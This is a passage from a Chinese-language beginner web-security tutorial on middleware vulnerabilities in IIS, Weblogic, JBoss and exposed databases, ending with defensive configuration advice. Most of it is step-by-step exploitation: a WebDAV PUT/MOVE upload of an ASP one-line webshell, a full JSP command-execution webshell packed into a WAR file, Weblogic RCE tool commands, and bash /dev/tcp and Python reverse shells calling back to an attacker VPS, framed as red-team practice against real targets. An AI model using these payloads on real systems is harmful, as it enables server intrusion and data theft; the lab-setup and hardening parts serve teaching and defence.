为什么能传上去？因为：
- 网站检查后缀名：一看后缀是 `.jpg`，合法！✅
- 实际上IIS会把它当ASP执行 😏

**第三步：访问文件，执行代码！** 🔓

上传成功后，访问文件路径，比如：
```
http://目标IP/upload/shell.asp;.jpg
```

然后用菜刀或蚁剑连接，密码是 `cmd`，直接getshell！

---

### IIS 短文件名泄露——8.3命名规则的信息泄露 🕵️

这个漏洞超级实用！在渗透测试前期信息收集阶段非常好用。

#### 什么是8.3命名规则？🤔

Windows为了兼容老的DOS系统，有一个"8.3短文件名"机制：
- 长文件名会被截断成 **8个字符的文件名 + 3个字符的后缀**
- 太长的文件名会用 `~1`、`~2`、`~3` …… 来编号

举个例子：
| 长文件名 | 8.3短文件名 |
|---------|-----------|
| `我的重要配置文件.config` | `我的重~1.CON` |
| `Web.config` | `WEB.CONFIG`（本身就短，不变） |
| `backup_2024.sql` | `BACKUP~1.SQL` |
| `admin_passwords.txt` | `ADMIN_~1.TXT` |
| `admin_login.aspx` | `ADMIN_~2.ASP`（如果前面有ADMIN_开头的文件） |

IIS在处理某些特殊请求时，会把短文件名泄露出来！这意味着：
- 即使网站没有目录遍历漏洞
- 即使文件名很长很复杂
- 我们也能**猜出网站目录下有什么文件**！

#### 漏洞原理 🔍

当IIS遇到 `~` 这个字符时，如果处理不当，会有以下表现：

| 请求方式 | 状态码 | 含义 |
|---------|-------|------|
| `/xxx~1*1/.aspx` | **404** | 这个目录/文件存在！✅ |
| `/xxx~9*1/.aspx` | **400** 或 其他 | 不存在 ❌ |

（注意：不同版本的IIS返回的状态码略有不同，但有明显差异）

通过这个差异，我们可以**暴力枚举**出所有的短文件名！

比如：
1. 先试 `/a~1*1/.aspx` → 404？说明有a开头的文件
2. 再试 `/ab~1*1/.aspx` → 404？说明是ab开头
3. 继续试 `/abc~1*1/.aspx` → 404！
4. 于是我们知道有个文件前3个字符是 `abc`
5. 继续试探，最终拼出完整的短文件名

#### 用工具一键枚举！🛠️

不用手动一个个试，有现成的工具！最常用的是 **IIS Short Name Scanner**。

在Kali里用：
```bash
# 安装（如果没有的话）
git clone https://github.com/irsdl/IIS-ShortName-Scanner.git
cd IIS-ShortName-Scanner

# 使用方法
python3 iis_shortname_scanner.py http://目标IP/

# 或者带扫描深度
python3 iis_shortname_scanner.py -u http://目标IP/ -d 3
```

扫描结果大概长这样：
```
[*] Scanning: http://target.com/
[*] Testing if target is vulnerable...
[+] Target is vulnerable! Method: ~1*1
[*] Enumerating files...
    FOUND: /WEB.CONFIG
    FOUND: /BACKUP~1.ZIP    (可能是 backup_xxx.zip)
    FOUND: /ADMIN_~1.ASPX   (可能是 admin_login.aspx)
    FOUND: /CONFID~1.TXT    (可能是 confidential.txt)
[+] Done! Found 4 files.
```

拿到短文件名之后，再去猜完整文件名：
- `BACKUP~1.ZIP` → 直接访问 `backup.zip`、`backup_2024.zip` 碰碰运气
- `ADMIN_~1.ASPX` → 访问 `admin.aspx`、`admin_login.aspx`、`admin_panel.aspx`
- `WEB.CONFIG` → 直接下载，看数据库连接字符串！💥

#### 漏洞实战价值 💰

这个漏洞看起来只是"信息泄露"，但实战中经常能打出暴击：

1. **挖到备份文件**：`BACKUP~1.ZIP` → 下下来，里面有整站源码+数据库密码
2. **找到后台地址**：`ADMIN_~1.ASPX` → 直接访问后台，开始爆破弱口令
3. **下载配置文件**：`WEB.CONFIG` → 里面的MSSQL连接字符串，直接连数据库
4. **找到编辑器页面**：`FCKEDIT~1/` → FCKeditor编辑器，直接传webshell

护网行动中，很多突破口就是从IIS短文件名泄露开始的！

---

### IIS PUT上传 / WebDAV漏洞 📥

IIS还有一个经典漏洞：**开启了WebDAV + PUT方法，且权限配置不当**。

WebDAV简单说就是"Web版的文件管理器"，可以通过HTTP请求上传、删除、修改服务器上的文件。如果配置不当，任何人都能往服务器上写文件！

#### 快速检测方法 ✅

用Burp Suite或curl发送OPTIONS请求：
```http
OPTIONS / HTTP/1.1
Host: 目标IP
```

看响应头里的 `Allow` 字段，如果有 **PUT、MOVE、DELETE、COPY** 这些方法，说明开启了WebDAV！

#### 上传流程 📝

**第一步：PUT上传txt文件**
```http
PUT /shell.txt HTTP/1.1
Host: 目标IP
Content-Length: 20

<%eval request("x")%>
```
（为什么传txt？因为很多IIS不允许直接PUT asp/aspx文件）

**第二步：MOVE改名，把txt变成asp**
```http
MOVE /shell.txt HTTP/1.1
Host: 目标IP
Destination: /shell.asp
```

如果返回 **201 Created** 或 **204 No Content**，说明成功！🎉

**第三步：访问shell.asp拿权限**

---

### IIS漏洞思维导图速记 🧠

<svg width="800" height="300" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <linearGradient id="iisbg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#f0f4ff"/>
      <stop offset="100%" stop-color="#e9ddff"/>
    </linearGradient>
  </defs>
  <rect width="800" height="300" rx="14" fill="url(#iisbg)"/>
  <g transform="translate(40,40)">
    <rect x="0" y="0" width="140" height="50" rx="10" fill="#7c3aed"/>
    <text x="70" y="24" text-anchor="middle" fill="#fff" font-weight="bold" font-size="16">IIS 🪟</text>
    <text x="70" y="42" text-anchor="middle" fill="#ede9fe" font-size="11">Windows 专属</text>
  </g>
  <!-- 分支1 -->
  <line x1="180" y1="65" x2="230" y2="40" stroke="#666" stroke-width="2"/>
  <g transform="translate(230,10)">
    <rect x="0" y="0" width="180" height="60" rx="10" fill="#fff" stroke="#7c3aed" stroke-width="2"/>
    <text x="90" y="25" text-anchor="middle" fill="#7c3aed" font-weight="bold" font-size="14">① IIS6.0 解析漏洞</text>
    <text x="90" y="45" text-anchor="middle" fill="#333" font-size="11">shell.asp;.jpg → 当ASP执行</text>
  </g>
  <!-- 分支2 -->
  <line x1="180" y1="65" x2="230" y2="115" stroke="#666" stroke-width="2"/>
  <g transform="translate(230,85)">
    <rect x="0" y="0" width="180" height="60" rx="10" fill="#fff" stroke="#7c3aed" stroke-width="2"/>
    <text x="90" y="25" text-anchor="middle" fill="#7c3aed" font-weight="bold" font-size="14">② 短文件名泄露</text>
    <text x="90" y="45" text-anchor="middle" fill="#333" font-size="11">8.3规则 · ~1*1猜文件名</text>
  </g>
  <!-- 分支3 -->
  <line x1="180" y1="65" x2="230" y2="190" stroke="#666" stroke-width="2"/>
  <g transform="translate(230,160)">
    <rect x="0" y="0" width="180" height="60" rx="10" fill="#fff" stroke="#7c3aed" stroke-width="2"/>
    <text x="90" y="25" text-anchor="middle" fill="#7c3aed" font-weight="bold" font-size="14">③ PUT / WebDAV</text>
    <text x="90" y="45" text-anchor="middle" fill="#333" font-size="11">PUT传txt → MOVE改asp</text>
  </g>
  <!-- 实战价值 -->
  <g transform="translate(460,30)">
    <rect x="0" y="0" width="300" height="230" rx="12" fill="#fff8e6" stroke="#f59e0b" stroke-width="2"/>
    <text x="150" y="30" text-anchor="middle" fill="#b45309" font-weight="bold" font-size="16">🎯 实战中经常遇到的情况</text>
    <text x="20" y="60" fill="#78350f" font-size="13">• 老系统 Win2003 + IIS6.0 → 解析漏洞</text>
    <text x="20" y="88" fill="#78350f" font-size="13">• 政府/国企网站 → 短文件名泄露</text>
    <text x="20" y="116" fill="#78350f" font-size="13">• 短文件名扫到 BACKUP~1.ZIP</text>
    <text x="40" y="140" fill="#b45309" font-size="12">  → 下载 → 源码+数据库密码全拿到</text>
    <text x="20" y="168" fill="#78350f" font-size="13">• 扫到 ADMIN_~1.ASPX</text>
    <text x="40" y="192" fill="#b45309" font-size="12">  → 后台弱口令 → 上传Webshell</text>
    <text x="40" y="215" fill="#b45309" font-size="12">  → 直接拿服务器权限 🔥</text>
  </g>
</svg>

---

## Weblogic 反序列化漏洞 🏢🔥

### Weblogic是什么？企业级的"航空母舰" 🚢

Weblogic是Oracle公司出品的**Java EE应用服务器**，在大型企业里非常流行：
- 🏛️ 政府网站、电子政务系统
- 🏦 银行、证券、保险等金融系统
- 🏭 国企、央企、电力、能源等行业
- ✈️ 航空、铁路、交通等关键基础设施

为什么这些大厂喜欢用Weblogic？因为它功能最全、最稳定、支持最完整的Java EE规范——就像"五星级酒店"，什么服务都有，但价格也贵（商业授权几十万起）。

Weblogic默认端口：
- **7001**：HTTP端口（必扫！）
- **7002**：HTTPS端口
- 控制台：`http://IP:7001/console`（登录后部署应用）

**划重点**：Weblogic的漏洞特别多，而且**绝大多数都是RCE（远程代码执行）**，拿到就能直接控制服务器！护网行动中，Weblogic是红队最喜欢打的目标之一，一打一个准！

---

### 经典漏洞一：CVE-2019-2725（最著名的Weblogic漏洞）💥

#### 漏洞基本信息 📋
- **CVE编号**：CVE-2019-2725
- **影响版本**：Weblogic 10.3.6.0、12.1.3.0
- **漏洞类型**：反序列化RCE
- **危害等级**：严重（核弹级）💣💣💣
- **利用难度**：极低（直接打工具，一行命令搞定）
- **实战命中**：极高！护网中TOP3常见漏洞

#### 漏洞原理（简化版）🔍

Weblogic有个组件叫 **wls9_async_response.war**（异步响应服务），暴露了两个路径：
- `/_async/AsyncResponseService`
- `/_async/AsyncResponseServiceHttps`

这个组件接收XML格式的请求，里面可以传**Java序列化对象**。Weblogic在反序列化这些对象时，没有做任何过滤，导致攻击者可以构造恶意序列化数据，执行任意代码！

（新手不用深究原理，知道怎么用工具打就行！）

#### 环境搭建 🛠️

老规矩，Vulhub一键起：
```bash
cd /root/vulhub/weblogic/CVE-2019-2725
docker-compose up -d
```

启动成功后，访问 `http://你的IP:7001/console`，能看到Weblogic登录页面就行。

#### 复现步骤（零基础友好版）📝

**第一步：验证漏洞是否存在 ✅**

先用浏览器访问：
```
http://你的IP:7001/_async/AsyncResponseService
```

如果看到一个XML页面（大概长这样）：
```xml
<env:Envelope>
  <env:Body>
    <env:Fault>
      ...
      <faultcode>env:Server</faultcode>
      ...
    </env:Fault>
  </env:Body>
</env:Envelope>
```
**说明路径存在，99%有漏洞！**（这步叫"指纹识别"，实战中先批量扫这个路径）

---

**第二步：下载POC/EXP工具 🛠️**

Weblogic的漏洞不需要自己手写Payload，用现成的工具就行。推荐几个：

1. **WeblogicScan**（综合扫描器，一次扫所有Weblogic漏洞）
   ```bash
   git clone https://github.com/0xn0ne/weblogicScanner.git
   cd weblogicScanner
   pip3 install -r requirements.txt
   ```

2. **CVE-2019-2725 单独EXP**（各大安全社区都有）

新手直接用 **WeblogicScan**，一步到位：
```bash
python3 weblogic_scan.py -u http://你的IP:7001
```

扫描结果如果显示：
```
[+] CVE-2019-2725 存在漏洞！
[*] 建议使用 -e 参数进行利用
```
就说明可以打了！

---

**第三步：RCE执行命令 🔓**

用工具执行命令：
```bash
# 方法1：直接执行id命令看是否成功
python3 weblogic_scan.py -u http://目标IP:7001 -e CVE-2019-2725 -c "id"

# 预期返回：
# uid=0(root) gid=0(root) groups=0(root)
# 说明执行成功！🎉
```

**实战常用的命令**：
```bash
# 查看当前用户
whoami

# 查看网站绝对路径
pwd

# 查看当前目录
ls -la

# 写入一句话木马（到Weblogic部署目录）
echo '<%@page import="java.util.*,java.io.*"%><%if(request.getParameter("cmd")!=null){Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));InputStream in=p.getInputStream();int a;while((a=in.read())!=-1){out.print((char)a);}in.close();}%>' > /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/......./war/shell.jsp
```

---

**第四步：反弹Shell，永久控制 🔁**

在VPS上监听：
```bash
nc -lvvp 7777
```

然后用工具执行反弹命令：
```bash
bash -i >& /dev/tcp/你的VPS/7777 0>&1
```

（Weblogic一般用Python反弹更稳：
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("VPS-IP",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
）

---

### 经典漏洞二：CVE-2020-14882（console未授权RCE）🎯

#### 漏洞特点
- **CVE-2020-14882 + CVE-2020-14883**（两个配合打）
- **影响版本**：Weblogic 10.3.6.0 ~ 14.1.1.0（几乎全版本中招！）
- **最爽的地方**：不需要用户名密码，**未授权**直接打！
- **利用路径**：`/console/css/%252e%252e%252fconsole.portal`（绕过权限校验）

简单说就是：Weblogic的控制台本来需要登录，但攻击者通过URL编码的 `..` 绕过去了，直接进入控制台，然后调用后台的某个功能执行任意代码！

#### 复现超简单 ✨

访问：
```
http://目标IP:7001/console/css/%252e%252e%252fconsole.portal
```

如果看到Weblogic的后台页面（不需要登录！），说明存在CVE-2020-14882！

然后用现成的EXP工具，直接RCE：
```bash
python3 CVE-2020-14882_EXP.py http://目标IP:7001 "id"
# 返回 uid=0(root) ... 说明成功！
```

---

### Weblogic漏洞时间线与总结 📅

<svg width="800" height="340" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <linearGradient id="wlbg" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#fff1f1"/>
      <stop offset="100%" stop-color="#ffe9dd"/>
    </linearGradient>
  </defs>
  <rect width="800" height="340" rx="14" fill="url(#wlbg)"/>
  <text x="400" y="35" text-anchor="middle" fill="#dc2626" font-weight="bold" font-size="20">🔥 Weblogic 经典 RCE 漏洞时间线（护网红队最爱）</text>
  <!-- 时间轴 -->
  <line x1="60" y1="70" x2="740" y2="70" stroke="#dc2626" stroke-width="4"/>
  <!-- 节点 2015 -->
  <circle cx="100" cy="70" r="12" fill="#dc2626"/>
  <g transform="translate(40,90)"><text x="60" y="0" text-anchor="middle" fill="#000" font-weight="bold" font-size="14">2015</text><text x="60" y="22" text-anchor="middle" fill="#7f1d1d" font-size="12">CVE-2015-4852</text><text x="60" y="40" text-anchor="middle" fill="#7f1d1d" font-size="11">T3反序列化</text></g>
  <!-- 节点 2017 -->
  <circle cx="220" cy="70" r="12" fill="#dc2626"/>
  <g transform="translate(160,90)"><text x="60" y="0" text-anchor="middle" fill="#000" font-weight="bold" font-size="14">2017</text><text x="60" y="22" text-anchor="middle" fill="#7f1d1d" font-size="12">CVE-2017-3248</text><text x="60" y="40" text-anchor="middle" fill="#7f1d1d" font-size="11">JRMP反序列化</text></g>
  <!-- 节点 2018 -->
  <circle cx="340" cy="70" r="12" fill="#dc2626"/>
  <g transform="translate(280,90)"><text x="60" y="0" text-anchor="middle" fill="#000" font-weight="bold" font-size="14">2018</text><text x="60" y="22" text-anchor="middle" fill="#7f1d1d" font-size="12">CVE-2018-2628</text><text x="60" y="40" text-anchor="middle" fill="#7f1d1d" font-size="11">T3协议反序列化</text></g>
  <!-- 节点 2019 -->
  <circle cx="460" cy="70" r="14" fill="#f59e0b" stroke="#dc2626" stroke-width="3"/>
  <g transform="translate(400,90)"><rect x="0" y="0" width="120" height="52" rx="8" fill="#fef3c7" stroke="#f59e0b" stroke-width="2"/>
    <text x="60" y="20" text-anchor="middle" fill="#92400e" font-weight="bold" font-size="14">⭐ 2019</text>
    <text x="60" y="38" text-anchor="middle" fill="#7c2d12" font-size="12">CVE-2019-2725</text>
    <text x="60" y="55" text-anchor="middle" fill="#7c2d12" font-size="10">实战命中TOP1！</text>
  </g>
  <!-- 节点 2020-1 -->
  <circle cx="580" cy="70" r="12" fill="#dc2626"/>
  <g transform="translate(520,90)"><text x="60" y="0" text-anchor="middle" fill="#000" font-weight="bold" font-size="14">2020初</text><text x="60" y="22" text-anchor="middle" fill="#7f1d1d" font-size="12">CVE-2020-2555</text><text x="60" y="40" text-anchor="middle" fill="#7f1d1d" font-size="11">反序列化RCE</text></g>
  <!-- 节点 2020-2 -->
  <circle cx="700" cy="70" r="14" fill="#f59e0b" stroke="#dc2626" stroke-width="3"/>
  <g transform="translate(640,90)"><rect x="0" y="0" width="120" height="52" rx="8" fill="#fef3c7" stroke="#f59e0b" stroke-width="2"/>
    <text x="60" y="20" text-anchor="middle" fill="#92400e" font-weight="bold" font-size="14">⭐ 2020末</text>
    <text x="60" y="38" text-anchor="middle" fill="#7c2d12" font-size="12">CVE-2020-14882</text>
    <text x="60" y="55" text-anchor="middle" fill="#7c2d12" font-size="10">未授权console RCE</text>
  </g>
  <!-- 提示框 -->
  <g transform="translate(40,200)">
    <rect x="0" y="0" width="720" height="115" rx="12" fill="#fff" stroke="#dc2626" stroke-width="2"/>
    <text x="360" y="30" text-anchor="middle" fill="#dc2626" font-weight="bold" font-size="16">💡 新手记住这三点就够了</text>
    <text x="30" y="60" fill="#000" font-size="14">① 端口 7001 必扫！看到Weblogic，先批量测上面几个CVE</text>
    <text x="30" y="86" fill="#000" font-size="14">② 不用自己写Payload，用 WeblogicScan / 各大EXP工具一键打</text>
    <text x="30" y="112" fill="#000" font-size="14">③ 实战中90%的Weblogic都没打补丁，一打一个准！💥</text>
  </g>
</svg>

---

## JBoss 漏洞实战 🟥

### JBoss是什么？红帽的"商务酒店" 🏨

JBoss（现在叫WildFly）是红帽公司出品的开源Java应用服务器。定位介于Tomcat（快捷酒店）和Weblogic（五星酒店）之间：

| 对比项 | Tomcat | JBoss/WildFly | Weblogic |
|-------|--------|--------------|----------|
| 重量 | 轻量 | 中等 | 重量级 |
| 价格 | 免费开源 | 免费开源 | 商业收费（几十万） |
| Java EE支持 | 部分（Servlet/JSP） | 完整 | 完整 |
| 适用场景 | 中小型项目 | 中大型企业 | 超大企业/金融/政府 |

JBoss的经典后台路径（记下来，实战扫目录必带！）：
- `/jmx-console/` —— 老版本JBoss 4.x/5.x 的JMX管理控制台
- `/admin-console/` —— 新版本的管理后台
- `/web-console/` —— Web控制台
- `/invoker/JMXInvokerServlet` —— JMX调用入口（反序列化入口）

JBoss默认端口：**8080**（和Tomcat一样）、**9990**（WildFly管理端口）、**1099**（JNDI端口）

---

### 漏洞一：JMX Console 未授权 + WAR部署getshell 🎯

这是JBoss最经典的利用方式，和Tomcat的WAR部署思路一模一样！

#### 利用条件：
- 能访问 `/jmx-console/`（不需要密码，未授权 ✅）
- JBoss版本：4.x ~ 5.x（老版本，实战中特别多！）

#### 复现步骤（和Tomcat几乎一样）📝

**第一步：访问JMX Console，确认未授权** 🔍

在浏览器里打开：
```
http://目标IP:8080/jmx-console/
```

如果直接能进入下面这个页面（不需要登录）：
- 页面标题是 "JBoss Management" 或 "JMX Management Console"
- 有一大堆 `<name=xxx service=xxx>` 的链接
- 能看到 **jboss.web** 这个部分

**说明存在未授权访问！可以打！** 🎉

---

**第二步：找到部署功能 🎛️**

在JMX Console页面里：
1. 找到 **jboss.web** 区块
2. 点进去，找到 **name=DeploymentFileRepository,type=Deployer** 或者 **name=MainDeployer**
3. 里面有个方法叫 **deploy()** 或者 **store()**

或者更简单的方法——直接找 **JBoss Web → host=localhost → deployment** 相关的MBean。

（新手不用记这么多，直接用工具一键部署WAR包！）

---

**第三步：制作WAR木马包** 📦

和Tomcat完全一样！准备一个JSP一句话木马 `shell.jsp`：
```jsp
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%>
<%
    if(request.getParameter("cmd")!=null){
        Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));
        InputStream in=p.getInputStream();
        int a;
        while((a=in.read())!=-1){out.print((char)a);}
        in.close();
    }
%>
```

打成WAR包：
```bash
jar -cvf jboss_shell.war shell.jsp
```

---

**第四步：上传并部署WAR包** 📤

方法一：通过JMX Console图形界面操作（有个deploy/upload的功能）

方法二：用现成EXP工具一键部署
```bash
# 推荐工具：JBossDeployer
python3 jboss_deploy.py -u http://目标IP:8080 -w jboss_shell.war
```

工具会自动：
1. 上传WAR包到JBoss的部署目录
2. JBoss会自动解压并部署这个应用
3. 部署路径一般是 `/jboss_shell/shell.jsp`

---

**第五步：访问Webshell拿权限 🔓**

浏览器打开：
```
http://目标IP:8080/jboss_shell/shell.jsp?cmd=id
```

返回 `uid=0(root) gid=0(root)...` → getshell成功！🎉

然后菜刀/蚁剑连接，密码是 `cmd`（POST方式）。

---

### 漏洞二：JBoss 反序列化漏洞（JMXInvokerServlet）🔓

JBoss 4.x/5.x/6.x 版本在 `/invoker/JMXInvokerServlet` 和 `/invoker/EJBInvokerServlet` 路径上存在**未授权的Java反序列化漏洞**。

利用方式：
1. 用ysoserial生成反序列化Payload（CommonsCollections5或CommonsCollections1链）
2. 把Payload序列化后发给 `/invoker/JMXInvokerServlet`
3. JBoss反序列化时执行恶意代码 → RCE！

（新手暂时了解即可，等反序列化专题学完再动手～）

快速验证漏洞是否存在：
```bash
curl -v http://目标IP:8080/invoker/JMXInvokerServlet
```
如果返回的响应 `Content-Type` 是 `application/x-java-serialized-object`，那恭喜你，**100%有反序列化漏洞**！直接上工具打就行。

---

### JBoss 漏洞利用流程图

<svg width="800" height="310" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <linearGradient id="jbbg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#fdf4ff"/>
      <stop offset="100%" stop-color="#eff6ff"/>
    </linearGradient>
  </defs>
  <rect width="800" height="310" rx="14" fill="url(#jbbg)"/>
  <text x="400" y="36" text-anchor="middle" fill="#9333ea" font-weight="bold" font-size="20">🟥 JBoss 漏洞利用思路导图（护网实战版）</text>
  <!-- 第一步：扫描 -->
  <g transform="translate(40,60)">
    <rect x="0" y="0" width="170" height="70" rx="12" fill="#9333ea"/>
    <text x="85" y="30" text-anchor="middle" fill="#fff" font-weight="bold" font-size="15">① 端口&目录扫描</text>
    <text x="85" y="52" text-anchor="middle" fill="#f5e9ff" font-size="11">8080/9990 · /jmx-console/</text>
    <text x="85" y="68" text-anchor="middle" fill="#f5e9ff" font-size="11">/invoker/JMXInvokerServlet</text>
  </g>
  <!-- 箭头 -->
  <line x1="210" y1="95" x2="260" y2="95" stroke="#333" stroke-width="3" marker-end="url(#arrow)"/>
  <defs><marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><polygon points="0 0, 10 3, 0 6" fill="#333"/></marker></defs>
  <!-- 分支判断 -->
  <g transform="translate(260,65)">
    <polygon points="90,0 180,45 90,90 0,45" fill="#fde68a" stroke="#d97706" stroke-width="2"/>
    <text x="90" y="40" text-anchor="middle" fill="#78350f" font-weight="bold" font-size="13">能访问哪个路径？</text>
    <text x="90" y="58" text-anchor="middle" fill="#78350f" font-size="11">（判断漏洞类型）</text>
  </g>
  <!-- 分支A 左下方 -->
  <line x1="350" y1="140" x2="230" y2="200" stroke="#333" stroke-width="2"/>
  <g transform="translate(80,180)">
    <rect x="0" y="0" width="220" height="80" rx="12" fill="#fff" stroke="#dc2626" stroke-width="2"/>
    <text x="110" y="22" text-anchor="middle" fill="#dc2626" font-weight="bold" font-size="14">A. jmx-console 未授权</text>
    <text x="110" y="44" text-anchor="middle" fill="#000" font-size="12">→ 找到DeploymentFileRepository</text>
    <text x="110" y="64" text-anchor="middle" fill="#000" font-size="12">→ 上传WAR木马 → getshell 🔥</text>
  </g>
  <!-- 分支B 右下方 -->
  <line x1="350" y1="140" x2="520" y2="200" stroke="#333" stroke-width="2"/>
  <g transform="translate(440,180)">
    <rect x="0" y="0" width="220" height="80" rx="12" fill="#fff" stroke="#059669" stroke-width="2"/>
    <text x="110" y="22" text-anchor="middle" fill="#059669" font-weight="bold" font-size="14">B. JMXInvokerServlet</text>
    <text x="110" y="44" text-anchor="middle" fill="#000" font-size="12">→ 返回 serialized-object?</text>
    <text x="110" y="64" text-anchor="middle" fill="#000" font-size="12">→ ysoserial生成CC链 → RCE</text>
  </g>
  <!-- 最终 -->
  <g transform="translate(680,190)">
    <rect x="0" y="0" width="100" height="70" rx="14" fill="#dc2626"/>
    <text x="50" y="28" text-anchor="middle" fill="#fff" font-weight="bold" font-size="15">getshell</text>
    <text x="50" y="50" text-anchor="middle" fill="#fee2e2" font-size="11">服务器沦陷 💥</text>
  </g>
  <line x1="660" y1="220" x2="680" y2="220" stroke="#333" stroke-width="3" marker-end="url(#arrow)"/>
  <line x1="300" y1="260" x2="680" y2="230" stroke="#333" stroke-width="2" opacity="0"/>
</svg>

---

好，六大中间件（Apache、Nginx、Tomcat、IIS、Weblogic、JBoss）我们就全部讲完了！这六个就是Web安全里中间件漏洞的"主力军"，掌握它们你就覆盖了实战中90%以上的中间件场景！

接下来，我们继续了解其他常见的组件漏洞～

---

## 其他中间件/组件漏洞简单介绍 🗃️

除了Web服务器软件，网站架构中还有很多其他的组件，这些组件也经常出现安全问题，而且往往危害特别大。我们来认识几个"常客"。

### Redis未授权访问 🔴

#### 什么是Redis？🤔

Redis是一个**内存数据库**，简单说就是把数据存在内存里的数据库，速度特别快，常用来做缓存、存Session、消息队列啥的。

Redis的默认端口是 **6379**。

#### 什么是未授权访问？🚪

什么叫未授权访问呢？就是——**Redis默认没有密码！而且默认绑定在0.0.0.0上（所有人都能连）**。

也就是说，如果管理员装了Redis，但是没有改配置，没有设置密码，也没有限制IP，那任何人都能直接连上这个Redis，想干嘛干嘛！

#### 能干嘛？😈

连上Redis之后，攻击者可以：

1. **读写数据**：比如偷走里面存的用户Session、缓存数据
2. **写webshell**：如果知道网站路径，可以直接往网站目录里写webshell
3. **写SSH公钥**：往root用户的 `.ssh/authorized_keys` 里写自己的公钥，然后直接用SSH登录服务器
4. **写定时任务**：写个反弹Shell的定时任务，到点自动连回来

总之，Redis未授权访问的危害非常非常大，基本上就等于服务器被人拿下了。

这就像什么呢？举个例子 🏠：
> 你家有个保险柜，你买的时候默认是没有密码的，而且保险柜就放在大门口，路过的人都能直接打开。
> 小偷路过，打开保险柜，把里面的钱都拿走了，还往你家钥匙盒里放了一把他自己配的钥匙，以后想什么时候来就什么时候来……

### MongoDB未授权访问 🟢

MongoDB是一个NoSQL数据库，默认端口 **27017**。

和Redis一样，MongoDB默认也是没有密码的，而且默认允许远程连接。如果管理员没改配置，就会存在未授权访问漏洞。

攻击者可以直接连上MongoDB，读取里面的所有数据，比如用户信息、订单数据啥的。虽然不像Redis那样能直接拿Shell，但数据泄露的危害也很大。

### MySQL弱口令 🐬

MySQL是最常用的关系型数据库，默认端口 **3306**。

很多管理员图省事，给MySQL的root用户设置的密码特别简单，甚至是空密码。攻击者可以直接用弱口令连上MySQL，然后：

- 偷走数据库里的所有数据（拖库）
- 如果权限够高，还能写文件、拿Shell

总之，数据库的安全也非常重要，很多网站被黑都是从数据库弱口令开始的。

### 为什么这些组件容易出问题？🤷‍♂️

不知道大家发现没有，这些组件漏洞有个共同点：**默认配置不安全**。

很多软件为了"开箱即用"，默认配置都设得特别宽松——没有密码、允许所有人访问、开了很多用不到的功能。管理员装完之后，直接就用了，也不改配置，于是就出问题了。

这就像你买了个新手机，默认没有锁屏密码，你拿到手直接就用了，也不设密码。手机丢了之后，里面的照片、聊天记录、银行卡啥的，人家随便看……

所以啊，**安全配置比什么都重要**！

---

## 中间件漏洞防御 🛡️

讲了这么多漏洞，大家可能有点慌了："我的天，这么多漏洞，那网站还能安全吗？"

别急，只要做好防护，中间件漏洞还是很好防的。我们来看看都有哪些防御措施。

### 1. 及时升级版本 ⬆️

这是最基本也是最重要的！很多漏洞都是老版本的问题，新版本早就修复了。只要你及时升级到最新的稳定版本，大部分漏洞都能直接规避。

就像你家的门锁，厂家发现有设计缺陷，召回了，你赶紧去换个新的，小偷就打不开了。

### 2. 正确配置 ⚙️

很多漏洞不是软件本身的问题，而是**配置不当**导致的。比如：
- Nginx解析漏洞 —— 配置不当 + cgi.fix_pathinfo
- 目录穿越 —— 配置不当
- Redis未授权 —— 配置不当

所以，配置一定要仔细写，按照安全规范来，不要瞎配。

比如Nginx防止解析漏洞，可以这么配置：

```nginx
location ~ \.php$ {
    try_files $uri =404;  # 加这一行，文件不存在直接404
    fastcgi_pass   127.0.0.1:9000;
    fastcgi_index  index.php;
    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
    include        fastcgi_params;
}
```

加个 `try_files $uri =404;`，文件不存在直接返回404，从根本上杜绝解析漏洞。

### 3. 关闭不必要的管理后台 🚫

像Tomcat的Manager后台，如果你用不到，就直接关掉或者删掉。能用的东西越少，攻击面就越小。

就像你家房子，墙上门越少，小偷能下手的地方就越少。

### 4. 强口令策略 🔐

能用弱口令的地方，一律改成强口令！

什么是强口令？至少满足：
- 长度8位以上
- 包含大小写字母、数字、特殊字符
- 不是常见的单词、生日、手机号

而且不同的系统要用不同的密码，别一个密码走天下。

实在记不住怎么办？用密码管理器啊，比如1Password、LastPass、KeePass啥的。

### 5. 限制访问IP 🚧

像管理后台、Redis、MongoDB这些东西，最好只允许内网或者特定IP访问，别暴露在公网上。

就像你家保险柜，别放在大门口，放在卧室的保险柜里，再装个防盗门，小偷想碰都碰不到。

### 6. WAF防护 🛡️

WAF（Web应用防火墙）可以挡住很多常见的攻击，比如SQL注入、XSS、文件包含啥的。虽然WAF不是万能的，但至少能挡住 script kiddies（脚本小子）的攻击。

就像小区门口的保安，虽然挡不住专业的小偷，但至少闲杂人等进不来。

---

## 新手学习建议 💡

讲了这么多，可能有小伙伴会问："这么多中间件，这么多漏洞，我该怎么学啊？"

别急，给新手们几个学习建议：

### 1. 先复现最经典的几个 🎯

新手不用一上来就想学遍所有漏洞，先把最经典、最常考的几个复现明白就行，比如：

- Apache解析漏洞
- Nginx解析漏洞
- Tomcat弱口令+WAR部署
- Redis未授权访问

这几个是"必考题"，先把这几个搞懂，其他的后面再说。

### 2. 理解原理，不要死记硬背 🧠

复现漏洞的时候，不要只会照着步骤敲命令，要多想几个"为什么"：
- 为什么会有这个漏洞？
- 漏洞的原理是什么？
- 什么情况下会触发这个漏洞？
- 怎么防御？

理解了原理，遇到新的漏洞你也能很快上手。不然的话，换个环境你就不会了。

就像学开车，你得理解发动机、变速箱的原理，才能开好车。要是只会死记硬背"先踩离合再挂档"，换辆车你可能就不会开了。

### 3. 关注最新的CVE 📰

